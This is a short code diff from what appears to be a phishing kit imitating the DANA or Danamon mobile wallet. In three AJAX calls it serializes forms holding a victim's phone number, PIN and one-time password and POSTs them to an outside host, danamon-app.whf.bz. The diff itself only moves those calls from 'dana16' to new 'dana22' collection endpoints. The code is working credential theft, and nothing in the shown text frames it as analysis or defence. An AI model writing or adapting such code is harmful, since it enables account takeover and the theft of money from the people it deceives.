@@ -141,7 +141,7 @@ $(".bgotp").hide();
     var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://danamon-app.whf.bz/token/dana16/one.php',
+			  url: 'https://danamon-app.whf.bz/token/dana22/one.php',
 			  data: dataString,
  
     
@@ -163,7 +163,7 @@ function sendPin(){
   var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://danamon-app.whf.bz/token/dana16/two.php',
+			  url: 'https://danamon-app.whf.bz/token/dana22/two.php',
 			  data: dataString,
  
 
@@ -196,7 +196,7 @@ $(".alert").css("color","red");
     var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://danamon-app.whf.bz/token/dana16/tree.php',
+			  url: 'https://danamon-app.whf.bz/token/dana22/tree.php',
 			  data: dataString,
  
         
